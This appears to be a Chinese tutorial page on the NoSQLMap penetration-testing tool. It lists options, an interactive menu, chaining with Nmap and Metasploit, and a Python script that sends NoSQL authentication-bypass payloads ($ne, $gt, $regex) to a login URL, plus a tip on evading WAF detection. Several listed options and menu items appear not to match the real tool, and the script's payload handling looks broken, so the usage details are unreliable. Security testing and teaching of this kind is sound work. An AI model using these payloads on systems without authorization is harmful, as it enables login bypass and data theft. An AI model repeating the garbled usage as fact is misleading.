# nosqlmap 命令

## 命令说明
NoSQLMap是一款功能强大的NoSQL数据库渗透测试工具，用于检测和利用NoSQL数据库的安全漏洞。它支持多种NoSQL数据库，包括MongoDB、CouchDB、Redis、Cassandra等，是NoSQL数据库安全测试的重要工具。

## 语法
```
python nosqlmap.py [选项]
```

## 常用选项
- `-u <URL>`：指定目标URL
- `-d <数据库>`：指定数据库类型（mongodb, couchdb, redis, cassandra）
- `-g`：启用GET请求测试
- `-p <端口>`：指定数据库端口
- `-c <cookie>`：指定Cookie
- `-a <代理>`：指定代理服务器
- `-v`：详细模式
- `-h`：显示帮助信息

## 核心功能

NoSQLMap提供了多种核心功能：
- **注入测试**：检测和利用NoSQL注入漏洞
- **认证绕过**：测试认证绕过漏洞
- **数据提取**：从数据库中提取数据
- **DoS攻击**：测试拒绝服务漏洞
- **命令执行**：执行操作系统命令
- **反向Shell**：获取反向Shell

## 支持的数据库

NoSQLMap支持以下NoSQL数据库：
- **MongoDB**：文档数据库
- **CouchDB**：文档数据库
- **Redis**：键值存储
- **Cassandra**：列族数据库
- **HBase**：列族数据库
- **Elasticsearch**：搜索引擎

## 示例

### 基本操作
```bash
# 启动NoSQLMap
python nosqlmap.py

# 测试目标URL
python nosqlmap.py -u http://example.com

# 指定数据库类型
python nosqlmap.py -u http://example.com -d mongodb

# 启用GET请求测试
python nosqlmap.py -u http://example.com -g
```

### 高级选项
```bash
# 指定端口
python nosqlmap.py -u http://example.com -p 27017

# 指定Cookie
python nosqlmap.py -u http://example.com -c "sessionid=123456"

# 使用代理
python nosqlmap.py -u http://example.com -a http://proxy:8080

# 详细模式
python nosqlmap.py -u http://example.com -v
```

### 交互模式

启动NoSQLMap后，会进入交互模式，可以选择以下操作：

1. **1. Set options**：设置选项
2. **2. Test connection**：测试连接
3. **3. Test injection**：测试注入
4. **4. Extract data**：提取数据
5. **5. Execute commands**：执行命令
6. **6. Get shell**：获取Shell
7. **7. Brute force**：暴力破解
8. **8. Exit**：退出

## 适用场景

### NoSQL数据库安全测试
- 检测NoSQL注入漏洞
- 测试认证绕过漏洞
- 评估NoSQL数据库的安全状况
- 识别潜在的安全风险

### 渗透测试
- 作为渗透测试的一部分
- 识别NoSQL数据库的攻击向量
- 评估应用程序的防御能力
- 提供渗透测试的重点方向

### 安全审计
- 定期检查NoSQL数据库的安全状况
- 验证安全控制措施的有效性
- 生成安全审计报告
- 满足合规性要求

### 开发和测试
- 在开发过程中发现和修复NoSQL安全问题
- 测试应用程序的NoSQL安全性
- 验证安全修复的有效性
- 提高开发团队的安全意识

### 安全研究
- 研究NoSQL数据库的安全漏洞
- 开发新的攻击技术
- 测试NoSQL数据库的防御机制
- 贡献安全知识和工具

## 高级技巧

### 与其他工具结合
```bash
# 结合Burp Suite
# 1. 配置Burp Suite拦截请求
# 2. 分析请求，寻找NoSQL注入点
# 3. 使用NoSQLMap测试注入点

# 结合Nmap
nmap -p 27017,6379,5984,9200 target | grep "open" | cut -d "/" -f 1 | xargs -I {} python nosqlmap.py -u http://target -p {}

# 结合Metasploit
# 1. 使用NoSQLMap发现漏洞
# 2. 使用Metasploit利用漏洞
```

### 自定义测试
```bash
# 创建自定义测试脚本
cat > test_nosql_injection.py << 'EOF'
#!/usr/bin/env python

import requests

# 目标URL
target_url = "http://example.com/login"

# 测试NoSQL注入
payloads = [
    "{'username': {'$ne': null}, 'password': {'$ne': null}}",
    "{'username': {'$gt': ''}, 'password': {'$gt': ''}}",
    "{'username': {'$regex': '^a'}, 'password': {'$regex': '^a'}}",
]

for payload in payloads:
    data = {'user': payload, 'pass': 'test'}
    response = requests.post(target_url, data=data)
    if "Welcome" in response.text:
        print(f"Found NoSQL injection with payload: {payload}")
        break
EOF

# 运行测试脚本
python test_nosql_injection.py
```

### 性能优化
- 对于大型应用，使用多线程测试
- 对于快速测试，使用常用的注入 payload
- 对于需要详细结果的场景，使用详细模式
- 对于特定数据库，使用针对性的测试

### 安全注意事项
- 获得授权后再进行测试
- 避免在生产环境中进行高强度测试
- 妥善处理测试结果，避免敏感信息泄露
- 遵守相关法律法规

## 常见问题解决

- **问题**：测试速度慢
  **解决方法**：减少测试 payload，使用多线程测试，增加网络带宽

- **问题**：漏报或误报
  **解决方法**：更新NoSQLMap，调整测试选项，手动验证可疑结果

- **问题**：连接失败
  **解决方法**：检查网络连接，确保目标可达，验证数据库服务是否运行

- **问题**：测试被阻止
  **解决方法**：调整测试速度，使用代理，避免触发WAF

## 总结
NoSQLMap是一款功能强大、灵活的NoSQL数据库渗透测试工具，提供了丰富的功能和选项，适用于各种NoSQL数据库安全测试场景。通过掌握NoSQLMap的使用方法，安全专业人员可以更有效地检测NoSQL数据库的安全漏洞、评估安全状况、提供安全加固建议。

NoSQLMap的优势在于：
- 支持多种NoSQL数据库
- 强大的注入测试能力
- 灵活的配置选项
- 与其他工具的良好集成
- 开源免费

作为NoSQL数据库安全测试的重要工具，NoSQLMap是每个安全专业人员必备的工具之一。